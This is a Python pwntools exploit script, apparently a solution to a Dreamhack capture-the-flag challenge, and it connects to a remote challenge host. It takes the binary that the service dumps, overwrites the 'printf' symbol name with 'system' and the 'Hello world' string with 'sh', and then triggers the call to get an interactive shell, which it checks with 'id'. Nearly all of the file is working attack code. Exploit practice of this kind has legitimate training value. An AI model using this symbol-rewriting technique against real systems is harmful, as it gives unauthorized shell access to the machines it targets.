#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
#context.binary = elf = ELF('', checksec=False)

#libc = ELF('', checksec=False)
#libc = elf.libc

gs = """
b *main
"""

info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)
rcu = lambda data: io.recvuntil(data)
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
        #return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path}, gdbscript=gs)
    elif args.REMOTE:
        return remote('host3.dreamhack.games', 22971)
    else:
        return process(elf.path)
        #return process(elf.path, env={"LD_LIBRARY_PATH": libc.path})


def find_word(sentence):
    num = 0
    seperate = 0
    flag = 0

    for i in sentence:
        if i == '\\' and seperate == 0:
            num += 1
            flag = 5
            seperate += 1

        elif seperate == 0:
            num += 1

        if flag != 0:
            seperate += 1
            flag -= 1

        if seperate == 6:
            seperate = 0

    return num

def change(num, change_word):
    for i in change_word:
        sl(b'3')
        sla(b": ", str(num).encode())
        sla(b": ", b'y')
        sla(b": ", str(ord(i)).encode())
        num += 1
        rcu(b'>> ')

def recv_bin():
    sl(b'1')
    sla(b'>> ', b'B')
    rcu(b"b'")
    byte_binary = str(rcu(b"----------Binary end")[:-20])
    rcu(b'>> ')
    return byte_binary

io = start()

rcu(b'>> ')
binary = recv_bin()
index1 = binary.find("printf")
index2 = binary.find("Hello world")

binary1 = binary[:index1]
binary2 = binary[:index2]

num1 = find_word(binary1) - 4
num2 = find_word(binary2) - 8

change(num1, "system")
change(num2, "sh\x00")

sl(b'4')
sl(b"id")
io.interactive()